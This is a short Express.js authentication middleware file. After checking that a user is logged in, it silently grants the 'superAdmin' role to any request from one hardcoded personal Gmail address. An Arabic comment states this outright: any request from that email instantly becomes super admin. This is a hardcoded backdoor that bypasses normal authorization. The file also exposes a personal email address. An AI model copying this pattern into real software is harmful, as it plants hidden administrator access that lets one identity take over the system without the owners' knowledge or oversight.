module.exports = (req, res, next) => {
  try {
    if (!req.user) return res.status(401).json({ message: "Unauthorized" });

    // 🔥 أي طلب من هذا الإيميل يصبح سوبر أدمن فوراً
    if (req.user.email === "khalafmahrous2000@gmail.com") {
      req.user.role = "superAdmin";
    }

    next();
  } catch (error) {
    console.log(error);
    res.status(500).json({ message: "Server error" });
  }
};
